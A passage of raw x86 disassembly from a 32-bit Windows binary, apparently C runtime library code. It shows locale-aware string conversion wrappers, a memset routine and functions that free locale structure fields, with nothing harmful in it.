  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
